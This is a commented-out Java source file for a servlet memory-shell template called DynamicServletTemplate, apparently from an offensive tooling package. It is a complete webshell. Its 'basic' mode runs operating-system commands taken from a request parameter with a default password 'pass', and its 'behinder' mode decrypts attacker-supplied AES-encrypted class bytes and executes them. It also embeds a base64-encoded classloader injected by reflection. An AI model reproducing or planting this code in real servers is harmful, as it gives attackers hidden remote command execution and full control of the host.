//package com.memshell.generic;
//
//import sun.misc.BASE64Decoder;
//import javax.crypto.Cipher;
//import javax.crypto.spec.SecretKeySpec;
//import javax.servlet.ServletRequest;
//import javax.servlet.ServletResponse;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.io.IOException;
//import java.lang.reflect.InvocationTargetException;
//import java.lang.reflect.Method;
//import java.util.Scanner;
//import java.util.UUID;
//
//public class DynamicServletTemplate extends HttpServlet {
//
//    private String password;
//    private Class myClassLoaderClazz;
//
//    public DynamicServletTemplate(){
//        super();
//        this.password = "pass";
//        initialize();
//    }
//
//    public DynamicServletTemplate(String password){
//        super();
//        this.password = password;
//        initialize();
//    }
//
//    @Override
//    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
//        doGet(request, response);
//    }
//
//    @Override
//    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
//        System.out.println("[+] Dynamic Servlet says hello");
//
//        String type = request.getParameter("type");
//        if(type != null && type.equals("basic")){
//            String cmd = request.getParameter(password);
//            if(cmd != null && !cmd.isEmpty()){
//                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
//                response.getWriter().println(result);
//            }
//        }else if(type != null && type.equals("behinder")){
//            try{
//                if(request.getParameter(password) != null){
//                    String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
//                    request.getSession().setAttribute("u", key);
//                    response.getWriter().print(key);
//                    return;
//                }
//
//                Cipher cipher = Cipher.getInstance("AES");
//                cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
//                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
//                Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
//                Object evilObject = evilClass.newInstance();
//                Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
//                targetMethod.invoke(evilObject, new Object[]{request, response});
//            }catch(Exception e){
//                e.printStackTrace();
//            }
//        }
//    }
//
//    private void initialize(){
//        try{
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            try{
//                this.myClassLoaderClazz = classLoader.loadClass("com.memshell.generic.MyClassLoader");
//            } catch (ClassNotFoundException e) {
//                Class clazz = classLoader.getClass();
//                Method method = null;
//                while(method == null && clazz != Object.class){
//                    try{
//                        method = clazz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    }catch(NoSuchMethodException ex){
//                        clazz = clazz.getSuperclass();
//                    }
//                }
//
//                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACRMY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcjsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAtkZWZpbmVDbGFzcwEALChbQkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAKU291cmNlRmlsZQEAEk15Q2xhc3NMb2FkZXIuamF2YQwABgAHAQAiY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcgwADwAaAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQACAAUAAAAAAAIAAAAGAAcAAQAIAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAJAAAABgABAAAABAAKAAAAFgACAAAABgALAAwAAAAAAAYADQAOAAEACQAPABAAAQAIAAAARAAEAAIAAAAQuwACWSu3AAMqAyq+tgAEsAAAAAIACQAAAAYAAQAAAAgACgAAABYAAgAAABAAEQASAAAAAAAQABMADgABAAEAFAAAAAIAFQ==";
//                byte[] bytes = new BASE64Decoder().decodeBuffer(code);
//                method.setAccessible(true);
//                this.myClassLoaderClazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
//            }
//        } catch (IllegalAccessException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InvocationTargetException e) {
//            e.printStackTrace();
//        }
//    }
//}
